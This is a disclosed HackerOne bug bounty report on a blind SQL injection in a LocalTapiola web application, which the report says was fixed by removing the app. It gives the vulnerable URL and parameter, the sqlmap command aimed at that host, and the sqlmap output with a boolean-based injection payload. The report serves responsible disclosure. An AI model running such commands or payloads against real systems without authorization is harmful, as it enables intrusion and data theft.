@@ -1,0 +1,58 @@
+ReportLink:https://hackerone.com/reports/200818
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/yasar
+ReportedTo:LocalTapiola(localtapiola)
+BountyAmount:1350.0
+Severity:medium
+State:Closed
+DateOfDisclosure:11.02.2017 8:56:10
+
+Summary:
+##Issue
+
+The reporter found a blind SQL Injection attack in an application in viestinta.lahitapiola.fi.
+
+##Fix
+
+The issue was investigated and found to be valid. The fix was to remove the application as it was not needed.
+
+##Reasoning
+
+The reported case was valid and within the scope of the bug bounty program. The issue was fixed and the reporter was awarded with a bounty. The report shows that the whole life cycle of an application must be considered and special care must be taken to ensure that outdated and unnecessary applications are removed in a timely manner.
+
+## Basic report information
+**Summary:** There is a SQL Injection vulnerability on http://viestinta.lahitapiola.fi/webApp/cancel_iltakoulu?regId=478836614&locationId=464559674
+
+**Domain:** viestinta.lahitapiola.fi
+
+## Steps To Reproduce:
+
+Tested on sqlmap framework with following command:
+./sqlmap.py -u "http://viestinta.lahitapiola.fi/webApp/cancel_iltakoulu?regId=478836614&locationId=464559674" -p regId
+
+
+## Additional material
+
+  *sqlmap output below:
+
+yasar@be:~/sqlmap# ./sqlmap.py -u "http://viestinta.lahitapiola.fi/webApp/cancel_iltakoulu?regId=478836614&locationId=464559674" -p regId
+
+.. snip ..
+
+GET parameter 'regId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:
+
+Parameter: regId (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: regId=478836614) AND 5454=5454 AND (5202=5202&locationId=464559674
+
+[17:38:22] [INFO] the back-end DBMS is PostgreSQL
+web application technology: Apache
+back-end DBMS: PostgreSQL
+
+
+## Related reports, best practices
+
+* https://hackerone.com/reports/179751
+* https://hackerone.com/reports/181826
